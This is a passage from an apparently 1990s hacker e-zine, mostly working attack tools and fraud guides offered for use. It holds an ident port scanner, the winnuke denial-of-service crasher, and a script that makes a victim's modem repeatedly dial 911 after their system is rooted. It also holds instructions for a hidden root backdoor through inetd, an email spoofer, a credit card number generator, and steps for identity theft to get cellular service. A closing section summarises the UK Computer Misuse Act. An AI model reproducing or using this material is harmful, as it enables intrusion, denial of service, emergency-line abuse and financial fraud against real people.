  struct sockaddr_in forconnect,forport,forident;
  int i,sockfd,identfd,len=sizeof(forport),hiport=9999,loport=1,curport;
  struct servent *service;
  struct hostent *host;
  char identbuf[15], recieved[85], *uid;

  if ((argc<2) || (argc>4))
    usage(BAD_ARGS);
  if (argc>2)
     loport=atoi(argv[2]);
  if (argc>3)
     hiport=atoi(argv[3]);
  if ((host=fill_host(argv[1],host))==NULL)
    usage(BAD_HOST);
  forconnect.sin_family=host->h_addrtype;
  forconnect.sin_addr.s_addr=*((long *)host->h_addr);
  forident.sin_family=host->h_addrtype;
  forident.sin_addr.s_addr=*((long *)host->h_addr);
  forident.sin_port=htons(113);

  if ((identfd=socket(AF_INET,SOCK_STREAM,0))== -1)
     usage(SOCK_ERR);
  if ((connect(identfd,(struct sockaddr *)&forident,sizeof(forident)))!=0)
     usage(NO_IDENT);
  close(identfd);

  for(curport=loport;curport<=hiport;curport++)
  {
     for(i=0;i!=85;i++)
        recieved[i]='\0';
     forconnect.sin_port=htons(curport);
     if ((sockfd=socket(AF_INET,SOCK_STREAM,0))== -1)
        usage(SOCK_ERR);


     if (connect(sockfd,(struct sockaddr *)&forconnect,sizeof(forconnect))==0)
     {
       if (getsockname(sockfd,(struct sockaddr *)&forport,&len)==0)
       {
          if ((identfd=socket(AF_INET,SOCK_STREAM,0))== -1)
             usage(SOCK_ERR);
          if (connect(identfd,(struct sockaddr *)&forident,sizeof(forident))==0)
          {
             sprintf(identbuf,"%u,%u",htons(forconnect.sin_port),
                htons(forport.sin_port));

             write(identfd,identbuf,strlen(identbuf)+1);
             read(identfd,recieved,80);
             recieved[strlen(recieved)-1]='\0';
             uid=strrchr(recieved,' ');
             service=getservbyport(forconnect.sin_port,"tcp");
             printf("Port: %3d\tService: %10s\tUserid: %s\n",curport,
                (service==NULL)?"(?)":service->s_name,uid);
          }
       }
    }
    close(sockfd);
    close(identfd);
  }
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  8. Windoze NT / 95 Killer : winnuke.c : _eci
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*        winnuke.c - (05/07/97)  By _eci            */
/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */


#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#define dport 139  /* Attack port: 139 is what we want */

int x, s;
char *str = "Bye";  /* Makes no diff */
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) {
     struct sockaddr_in blah;
     struct hostent *he;
     bzero((char *)&blah,sizeof(blah));
     blah.sin_family=AF_INET;
     blah.sin_addr.s_addr=inet_addr(server);
     blah.sin_port=htons(port);


    if ((he = gethostbyname(server)) != NULL) {
        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else {
         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
           perror("gethostbyname()");
           return(-3);
         }
    }

        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
             perror("connect()");
             close(sock);
             return(-4);
        }
        printf("Connected to [%s:%d].\n",server,port);
        return;
}


void main(int argc, char *argv[]) {

     if (argc != 2) {
       printf("Usage: %s <target>\n",argv[0]);
       exit(0);
     }

     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket()");
        exit(-1);
     }

     open_sock(s,argv[1],dport);


     printf("Sending crash... ");
       send(s,str,strlen(str),MSG_OOB);
       usleep(100000);
     printf("Done!\n");
     close(s);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 1. Federal Bugging Frequencies : Weapon-X
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Commonly Used by Federal Agencies for Bugs, Wireless Microphones,
and Body Wires (also 138-220 mhz, and 399-420 mhz, under 25-50 mw).

  149.3500, 165.9125, 167.3375, 167.3425, 167.4875, 168.0115, 
  169.2000, 169.4450, 169.5050, 170.2450, 170.3050, 171.0450,
  171.1050, 171.4500, 171.6000, 171.7500, 171.8450, 171.8500,
  171.9050, 172.0000, 172.2000, 172.2125, 172.2375, 172.2625,
  172.2875, 172.3125, 172.3375, 172.3625, 172.3875, 172.5500
  173.3375 

  169.445, 169.505, 170.245, 170.305, 171.045, 171.105, 171.845, 171.905

  27.5750 Customs Low Power <  5 watts
  27.5850 Customs Low Power <  5 watts
 163.1000 Customs Low Power < 30 watts
 418.5750 Customs Low Power < 30 watts

 40.1200 Federal Shared Mobile Locator Tranmitters "Bumper Beepers"
 40.1700 Federal Shared Mobile Locator Tranmitters "Bumper Beepers"
 40.2200 Federal Shared Mobile Locator Tranmitters "Bumper Beepers"
 40.2700 Federal Shared Mobile Locator Tranmitters "Bumper Beepers"

 164.9125 FBI Surveillance 
 165.9125 ATF F5 Surveillance
 166.2875 ATF
 170.4125 ATF
 407.8000 Secret Service
 406.2750 Secret Service
 408.5000 Secret Service
 408.9750 Secret Service
        
 172.2000 DOJ/DEA CH.1
 171.6000 DOJ/DEA CH.2 
 418.0500 DEA Low Power
 418.0750 DEA Low Power
 418.5750 DEA Low Power
 418.7500 DEA
 418.6750 DEA
 418.9000 DEA F2 CINDY (416.325) Surveillance
 418.7500 DEA F3 GAIL Surveillance/Strike Force
 418.6750 DEA F4 EMILY (416.325) Surveillance

 407.8000 CIA, State Department
 408.0500 Federal Shared
 408.5750 Federal Shared
 409.4000 Federal Shared

 960-1215mhz Spread Spectrum Systems (Wideband)

 Generally Recognized Federal Bug/Spy Bands

 Primary   - 25-50mhz, 135-175mhz, 225-440mhz, 1710-1950mhz, 8.3-12.5ghz

 Secondary - 890mhz-5.50ghz, 7.0-9.5ghz, 10-39.6ghz

 Also, Wide Band Frequency Hopping centered on various UHF-TV channels
 (ie: 510 or 670 mhz with a hopping width of +/- 25 mhz)

 Keep in mind that the federal government can use virtually any
 frequency between DC and light. So get scanning now!!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. 911 Autodialler Script : dk
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Okay, scenario...

Your Friend g1mpfuck is on his linux system, you have never really liked him,
and he has gone out to someplave for a few hours, to be back this evening...

If you root his system, and run this, his modem will dial 911 every 10 mins,
but as soon as you do run it, it will kill the pppd and dial the number, so if
he's on IRC, then he will quit... Here it is! Read the instructions in the
code first...


#!/bin/sh
# 911-autodial.sh
# 
# for use with linux boxes running DIP.
# dials 911 every ten minutes, and if the user is using pppd
# it kills pppd in order to place the call.

# IMPORTANT!!!
# add this line to root's crontab with: crontab -e root
# 2,12,22,32,42,52 * * * * /path/to/911-autodial.sh

# note: this assumes the modem device is: /dev/modem
# if it is otherwise change "port modem" to
# "port cua1" or whatever the modem device is 
# although it is usally /dev/modem.

echo "   get $local 0.0.0.0" >> /tmp/911.dip
echo "   get $remote 0.0.0.0" >> /tmp/911.dip
echo "   port modem" >> /tmp/911.dip
echo "   speed 38400" >> /tmp/911.dip
echo "   reset" >> /tmp/911.dip

echo "   send ATQ0V1E1X4\r" >> /tmp/911.dip
echo "   wait OK 2" >> /tmp/911.dip
echo "   dial 911" >> /tmp/911.dip

ps -aux|grep pppd|grep -v grep >> /tmp/ppp-check

grep "^root" /tmp/ppp-check > /dev/null 2>&1
if [ $? -ne 0 ] ; then
        echo "PPP IS DEAD" > /tmp/ppp-dead 
fi

if [ -f /tmp/ppp-dead ]; then
     /sbin/dip /tmp/911
     rm /tmp/ppp-*
     rm /tmp/911.dip
     exit 1
fi

kill `ps -ax|grep pppd|grep -v grep|awk 'BEGIN {FS="  ";OFS=" "} {print $1}`
/sbin/dip /tmp/911
rm /tmp/ppp-*
rm /tmp/911.dip
exit 1

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Cellular Calls Without Cloning : TRON
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

There are several ways to make free calls with a cellular phone that does not
have service with the hassle of cloning it, or if you have a phone that can't
be cloned or you don't want to buy the expensive equipment required, so here
are a few ways to do it from home with little risk...

1.) American Roaming Network.
-----------------------------

To reach the American Roaming Network (or something like it, depending on
where you are), put your phone on the alternate carrier side so it says roam,
then dial 0 and it should tell you your call is being forwarded.

At that point you should be connected to an automated system, form here you
have a couple of billing options...

To use a credit or calling card, you enter the area code and number you want
to call; for a calling card you then enter the card number and pin, for a 
credit card you then enter the card number and expirarion date, then the zip
code of the billing address. ARN takes MasterCard, American Express, and
most local and long distance company calling cards. They say they dont take
VISA anymore, but I've gotten them to work on the automated system.

If the number you call is busy or doesn't answer, you can press * and then
either leave a message that the system will deliver, or try another number.
If you want to dial another number you will have to put the zip code again
after the new number.

You can also make collect and 3rd party billed calls by dialing 0 instead of
the number to call when you connect to ARN. You will be sent to an operator,
tell them you would like to place a call. They will then ask how you would
like to bill it. You can set up a local dialup voice mail box and change
the greeting so it sounds like someone's there to accept the charges, the
operator has to read a script, so you have to adjust the timing to get it
just right.

ARN will not 3rd party or collect bill to 800 numbers, nor will they place
calls to 800 numbers charged to 3rd party numbers.

2.) Social Engineering.
-----------------------

Another way is to dial 611 and tell the customer support person that you're
having trouble getting through to the area you're trying yo call and could
they try place the call for you. This works about 50% of the time, it helps
to have the name and cell number of someone who has service with that
provider in case they ask for it, they might ask for the social security
number too, so be prepared, dumpster diving at a cell store is the easiest
place to get that info.

3.) Set Up Service With Someone Else's Info.
--------------------------------------------

The best way, and the one I prefer to cloning, is to get someone else's
information and set up service. The best place to get the information you'll
need is from a place that does credit checks, like a bank or car dealership.
Make sure they have a good rating, like A, B or C, then you wont be asked
for a deposit.

You'll need a name, address, social security number, drivers license number
and work number.

You will also need a cell phone that is not stolen. They will not activate a
stolen phone, when I tried they put me on hold and called the person who's
phone I had and then told me the person wanted me to mail the phone back to
them.

Also find and write down the electronic serial number, you'll need that too.
You then need to call a local cell service provider (ie. GTE MobilNet,
Cellular One, Bell South Mobility, etc.) on a phone you have. Let them tell 
you about the different service plans and pick one.

They will then ask for your "information" and ESN. Then they will ask to
call you back with your new cell number, tell them that you're out and
ask for a number to call them back at, they will have no problem with this.

Then call them back and they will tell you how to program your new number
into your phone, they might also tell you how to program in a new system ID
and pagin channel etc, this is no big deal.

Also ask when the billing cycle ends and when the bill is sent out, you will
want to stop using this number when the person you're billing it to gets
their bill.

Be sure to get call features like 3-way and call forwarding, they're always
useful to have.

I prefer this to cloning because its less worry and hassle and it lasts up
to a month.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 1. Getting Your Exploits Onto Systems : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

You want to get files or exploits onto another system, you can do this the
following few ways...

1) Mail The User The File.
--------------------------

This method is simple, easy to do, pretty undetectable, but sometimes may be
a touch too slow, depending on the location / speed of the system...just mail
login@host.com the file or whatever, then wait at the other side for them to
get it.

2) FTP to the system.
----------------------

Using an FTP client, you can FTP to the remote server from your system, then
upload the files to the server, but you will most probably get logged, and so
if your exploits fail, this may not be such a good idea...

3) Use cat to input the file from the terminal.
-----------------------------------------------

This is easy to do, pretty quick and effective, follow these steps...

FearFactory:~:$ cat > heh.c << STOP
#include <stdio.h>

main()
{
printf("Quit Laughin' At Yerself Yew Gimp :P\n"):
}
STOP
FearFactory:~:$ cat heh.c
#include <stdio.h>

main()
{
printf("Quit Laughin' At Yerself Yew Gimp :P\n"):
}
FearFactory:~:$ cc -o heh heh.c
FearFactory:~:$ heh
Quit Laughin' At Yerself Yew Gimp :P
FearFactory:~:$

I used "cat > filename.c << STOP" to input the file from the terminal, I could
have cut a file from another editor, then just pasted it to the terminal, then
when I type "STOP" and hit enter, cat stops taking input from the terminal and
EOF's the file...Then I cat it again, to prove that the STOP does not stay as
part of the file, then I proceed to compile the source using cc and then I run
the program, easy =)

Always remember to remove traces of exploits from the system if you fail, as
this is messy and could lead to the admin becoming suspicious, just keep your
technique clean, and you will learn some good skills...

Recommended Reading :
---------------------

  LINUX IN A NUTSHELL - A Desktop Quick Reference
  By Jessica Perry Hekman
  Copyright 1997 O'Reilly & Associates

  ISBN 1-56592-167-4

    UK  : 14.99
    US  : $19.95
    CAN : $28.95

I really like this book, its very easy to use, pretty compact, and 424 pages
long, the information in it will boost your skills by a long way if you are
a newbie, and there are alot of more advanced features, such as debugfs and
many other programs and their syntax. Basically its a dictionary of Linux
commands, along with a short explanation, the syntax for the command and
many examples, I have the first printing, which is January 1997, so this book
is not old at all, and pretty up-to-date...

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Fakemailing Techniques : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Fakemailing is old and very very easy to do. To use this simple fakemailing
program just make a file, such as letter.txt with the stuff you want to send
in it, like "Hey Bill! how's it going?" or whatever. Next compile the
fakemail.c using gcc -o sendfake sendfake.c ignore any warning messages.
Run the program using "sendfake" and follow the steps, simple as that =)

/**********************************************************/
/*                     SENDFAKE.C                         */
/*                                                        */
/*                                                        */
/*         Author: asm@quantum.syspac.com                 */
/*                                                        */
/*         To compile: gcc -o sendfake sendfake.c         */
/*         Usage     : sendfake                           */
/*                                                        */
/**********************************************************/

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
 
#define MAXLEN 256
 
int s;
 
int call_socket(char *hostname)
{
  struct sockaddr_in sa;
  struct hostent     *hp;
  int    a, s;
 
  if ((hp=gethostbyname(hostname))==NULL) return(-1);
  bzero(&sa, sizeof(sa));
  bcopy(hp->h_addr, (char *)&sa.sin_addr, hp->h_length);
  sa.sin_family = hp->h_addrtype;
  sa.sin_port = htons((u_short)25);
 
  if((s=socket(hp->h_addrtype, SOCK_STREAM, 0)) < 0)
    return(-1);
  if(connect(s, &sa, sizeof(sa)) < 0) {
    close(s);
    return(-1);
  }
  return(s);
}
 
int readln(char *buf)
{
  int to=0;
  char c;
 
  do {
    if(read(s, &c, 1)<1)
      return(0);
    if((c >= ' ') || (c <= 126))
      if(to<MAXLEN-1)
        buf[to++] = c;
  } while (c != '\n');
 
  buf[to] = '\0';
  return(1);
}
 
void writeln(char *buf)
{
  write(s, buf, strlen(buf));
  write(s, "\n",1);
}
 
void input(char *msg,char *pt)
{
   printf("%s: ",msg);
   gets(pt);
}
 
int main(void)
{
  char hostn[20];
  char from[40];
  char to[40];
  char name[40];
  char subject[60];
  char passw[20];
  char str[MAXLEN];
  char buf[MAXLEN];
  FILE *fp;

  printf("\n");
  printf("Welcome to sendfake!  The BEST fake/anon mailer there is!\n");
  printf("By asm@quantum.syspac.com\n");
  printf("\n"); 
  input("Host to fake mail from",hostn);
  if((s=call_socket(hostn)) <0) {
    perror("Connection error");
    exit(1);
  }
  readln(buf);
  gethostname(hostn,20);
  sprintf(str, "HELO %s", hostn);
  writeln(str);
  readln(buf);
  input("Fake email address fakemail is FROM",from);
  sprintf(str, "MAIL FROM: <%s>",from);
  writeln(str);
  readln(buf);
  do {
    input("Send fake mail TO",to);
    sprintf(str, "RCPT TO: <%s>",to);
    writeln(str);
    readln(buf);
    *(buf+3) = 0;
    if(atoi(buf) == 250) break; else printf("%s",buf+4);
  } while(1);
  input("Name of lamer getting the fake mail",name);
  input("Subject of fake mail",subject);
  writeln("DATA");
  sprintf(str,"To: %s <%s>",name,to);
  writeln(str);
  if(strlen(subject)) {
    sprintf(str, "Subject: %s", subject);
    writeln(str);
  }
  do {
    input("File to read and include in fake mail",str);
    if(!strlen(str)) {
      close(s);
      exit(1);
    }
    if((fp = fopen(str,"rt")) == NULL) printf("Could not find file %s\n", 
str);
    else break;
  } while(1);
  while(fgets(str,MAXLEN,fp)) write(s, str, strlen(str));
  writeln("\n.\n");
  readln(buf);
  writeln("QUIT\n");
  printf("Sent!!!\n");
  close(s);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Pascal Credit Card Generator Source : Lobster Guacamole
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 PROGRAM ccnum;

 { Written by Lobster Guacamole.                                              }
 {                                                                            }
 { I wrote this program because I enjoy fucking over every goddam bureacratic }
 { and/or facist aspect of our society.  This program simply spits out ten    }
 { random credit card numbers based on the bank prefix used.  See lines 58    }
 { through 61 for information on the bank prefix used.  There is also a lame  }
 { password feature for minor security.  See lines 42 through 50 for          }
 { information on the password feature.                                       }
 {                                                                            }
 { Remember, however, the numbers that are spit out may not work because      }
 { the credit card company may not have assigned that number to a customer    }
 { yet.  Have fun!                                                            }
 {                                                                            }
 { You can use a simple program like pas2c to translate this code into c      }
 {                                                              - Tetsu Khan  }

 USES
  Crt;

 VAR
  ccnum_count : Integer;


 PROCEDURE program_init;
  BEGIN
   Randomize;
   CheckBreak := False;
  END;

 PROCEDURE show_title;
  BEGIN
   ClrScr;
   Writeln;
   Writeln( 'CCNUM - Credit Card Number Generator.' );
   Writeln( 'Written by Lobster Guacamole.' );
   Writeln;
  END;


 PROCEDURE get_pwd;
  VAR
   program_pwd : String;

  BEGIN
   Writeln;
   Write( 'Enter password>' );      
   Readln( program_pwd );           

     IF program_pwd = 'a' THEN    { The current password is a lower case  }
      BEGIN                       { letter 'a'.  Recompile the program if }
       Writeln;                   { you change the password, of course.   }
       Writeln( 'Correct' );      { Change password on line 47 as well.   }
       Writeln;
      END;

     IF program_pwd <> 'a' THEN  { If you changed the password on line 40, }
      BEGIN                      { change it here, too.                    }
       Writeln;
       Writeln( 'Incorrect' );
       Halt;
      END;
  END;



 PROCEDURE make_ccnum;
  VAR
   ccnum_digits       : ARRAY[ 1..16 ] OF Integer;
   doub_odd_digits    : ARRAY[ 1..8 ] OF Integer;
   digit_count        : Integer;
   yn_choice          : Char;
   added_digits       : Integer;

  BEGIN

    ccnum_digits[1] := 5;   { This part may have to be changed depending }
    ccnum_digits[2] := 4;   { on the bank prefix used.  The bank prefix  }
    ccnum_digits[3] := 2;   { here is '5424', the prefix for Citibank.   }
    ccnum_digits[4] := 4;   { Recompile the program if you change it.    }

    REPEAT

       FOR digit_count := 5 TO 16 DO
         BEGIN
          ccnum_digits[ digit_count ] := Random(10);
         END;

         doub_odd_digits[1]  := 2 * ccnum_digits[1];
           IF doub_odd_digits[1] > 9 THEN
           doub_odd_digits[1] := doub_odd_digits[1] - 9;

         doub_odd_digits[2]  := 2 * ccnum_digits[3];
           IF doub_odd_digits[2] > 9 THEN
           doub_odd_digits[2] := doub_odd_digits[2] - 9;

         doub_odd_digits[3]  := 2 * ccnum_digits[5];
           IF doub_odd_digits[3] > 9 THEN
           doub_odd_digits[3] := doub_odd_digits[3] - 9;

         doub_odd_digits[4]  := 2 * ccnum_digits[7];
           IF doub_odd_digits[4] > 9 THEN
           doub_odd_digits[4] := doub_odd_digits[4] - 9;

         doub_odd_digits[5]  := 2 * ccnum_digits[9];
           IF doub_odd_digits[5] > 9 THEN
           doub_odd_digits[5] := doub_odd_digits[5] - 9;

         doub_odd_digits[6] := 2 * ccnum_digits[11];
           IF doub_odd_digits[6] > 9 THEN
           doub_odd_digits[6] := doub_odd_digits[6] - 9;

         doub_odd_digits[7] := 2 * ccnum_digits[13];
           IF doub_odd_digits[7] > 9 THEN
           doub_odd_digits[7] := doub_odd_digits[7] - 9;

         doub_odd_digits[8] := 2 * ccnum_digits[15];
           IF doub_odd_digits[8] > 9 THEN
           doub_odd_digits[8] := doub_odd_digits[8] - 9;

          added_digits := doub_odd_digits[1] + doub_odd_digits[2] +
                          doub_odd_digits[3] + doub_odd_digits[4] +
                          doub_odd_digits[5] + doub_odd_digits[6] +
                          doub_odd_digits[7] + doub_odd_digits[8] +
                          ccnum_digits[2]    + ccnum_digits[4] +
                          ccnum_digits[6]    + ccnum_digits[8] +
                          ccnum_digits[10]   + ccnum_digits[12] +
                          ccnum_digits[14]   + ccnum_digits[16];

    UNTIL added_digits MOD 10 = 0;


    Writeln( ' ', ccnum_digits[1],
                  ccnum_digits[2],
                  ccnum_digits[3],
                  ccnum_digits[4],
                  ' ',
                  ccnum_digits[5],
                  ccnum_digits[6],
                  ccnum_digits[7],
                  ccnum_digits[8],
                  ' ',
                  ccnum_digits[9],
                  ccnum_digits[10],
                  ccnum_digits[11],
                  ccnum_digits[12],
                  ' ',
                  ccnum_digits[13],
                  ccnum_digits[14],
                  ccnum_digits[15],
                  ccnum_digits[16] );
  END;



 BEGIN
  program_init;
  show_title;
  get_pwd;
  FOR ccnum_count := 1 TO 10 DO make_ccnum;
 END.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. in.courierd : backdoor on port 530 : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

As root do the following (without the %'s ;]) to setup the backdoor.
--------------------------------------------------------------------

 [This Method Has Been Tested On A Linux 2.0.30]

% cp /bin/bash /usr/sbin/in.courierd

% chmod 4755 /usr/sbin/in.courierd           [optional, depends on system]

% echo "courier    stream  tcp   nowait   root   /usr/sbin/in.courierd" >> /etc/inetd.conf

% /sbin/pidof inetd.conf                     [to find the pid of inetd.conf]

% kill -HUP <pid>                            [replace the <pid> with the real pid]

% telnet localhost 530                       [test backdoor]

 All commands to the backdoor must end with ;, for example....

  exit;
  ps -a;
  whoami;
  cd /;

 You are root when you use the backdoor, and you are not seen or logged. The
 last time I used this, it stayed up for 2 weeks =)

 The above commands I have tested in Linux, I have heard that you have to reboot
 a Sun for the new settings to take effect (shutdown -r now).
 But hey! its only a prototype at the moment until I make it cool and alot
 better =)

 Have fun.

 so1o

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. UK Laws On Computer Misuse : Darkfool
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This part is actually useful info, not like Darkfools lesser works...Partially
edited by me, the original can be now found at www.sinnerz.com/bible.htm -  T_K

Hey, this is an interesting little read. Please note it still can be quite
interesting even if you don't like in UK - Darkfool.

The 1990 Computer Misuse Act - UK
---------------------------------

In plain English.
-----------------

 "An Act to make provision for securing computer material against
 unauthorised access or modification; and for connected purposes"

{ This is the long title (header) of the Act and confirms what the act does
  and applies to. }


SECTION 1 Unauthorised access to computer material
--------------------------------------------------

TEXT:

A person is guilty of an offence if he causes a computer to perform any
function with intent to secure access to any program or data held in any
computer.

{ This means that if you can get access to files which you shouldn't be
  allowed to retrieve or read then you are committing a offence, this only
  applies if the person in question has intent ( meaning they are doing it
  on purpose, often referred to as hacking ) to carry this out. }

A person is guilty of an Offence if the access he intends to secure is
unauthorised; and he knows at the time when he causes the computer to
perform the function that that is the case.

{ This means that the person is guilty doesn't have authorisation to
  secure access to files then he is committing an offence. The person is
  not guilty if he/she doesn't know what they are trying to perform.
  This applies to everything i.e. any program, a program or data of any
  particular kind and a program or data held }

A person guilty of an offence under this section shall be
liable on summary conviction to imprisonment for a term not exceeding
six months or to a fine not exceeding level 5 on the standard scale or
to both. 

{ Meaning, you could go to prison for 6 months for committing
  an offence mentioned above ! You could also be subject to a fine 
  @ level 5, which is always changing. You have to be convicted of the
  crime first though ;) }


SECTION 2 Unauthorised access with intent to commit or facilitate
-----------------------------------------------------------------
commission of further offences
------------------------------

A person is guilty of an offence under this section if he commits an
offence under section 1 above. To commit an offence to which this
section applies or to facilitate the commission of such an offence
( whether by himself or by any other person) and the offence he intends
to commit or facilitate is referred to below in this section as the
further offence.

{ This meaning that what is mentioned in section 2
  applies to the person gaining unauthorised access to a computer system
  and to anyone who facilitates such a person }

This section applies to offences for which a person of twenty-one years
of age or over ( not previously convicted ) may be sentenced to
imprisonment for a term of five years.

{ This means that if you re-offend or facilitate to re-offend and have
  been convicted you are liable to 5 years imprisonment or/and a large
  fine }


SECTION 3 Unauthorised modification of computer material
--------------------------------------------------------

A person is guilty of an offence if he/she does any act that causes an
unauthorised modification of the contents of any computer; and at the
time when he does the act he has the requisite intent and the requisite
knowledge.

{ This means that if a person modifies computer material
  which he/she is not authorised to do he/she is guilty of committing
  an offence, however, the person must have the intent to carry out this
  crime else the person is not liable }

{ This next bit is the interesting bit }

For the purposes of the above section the requisite knowledge is an intent
to cause a modification of the contents of any computer and by so doing
to impair the operation of any computer; to prevent or hinder access to
any program or data held in any computer; to impair the operation of any
such program or the reliability of any such data. The intent need not be
directed at any particular computer; any particular program or data or a
program or data of any particular kind; or any particular modification.

